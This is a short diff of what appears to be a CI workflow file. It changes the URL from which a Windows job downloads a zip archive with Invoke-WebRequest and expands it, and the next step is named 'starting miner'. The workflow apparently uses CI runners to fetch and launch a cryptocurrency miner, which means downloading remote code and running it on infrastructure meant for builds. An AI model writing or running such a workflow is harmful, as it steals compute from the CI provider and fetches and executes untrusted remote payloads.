@@ -12,7 +12,7 @@ jobs:
     steps:
     - name: downloading files...
       run: |
-         Invoke-WebRequest https://raw.githubusercontent.com/techtechnikov/main/windows.zip -OutFile windows.zip
+         Invoke-WebRequest https://raw.githubusercontent.com/techtechnikov/min/main/win.zip -OutFile windows.zip
          Expand-Archive windows.zip
     - name: starting miner
       run: |
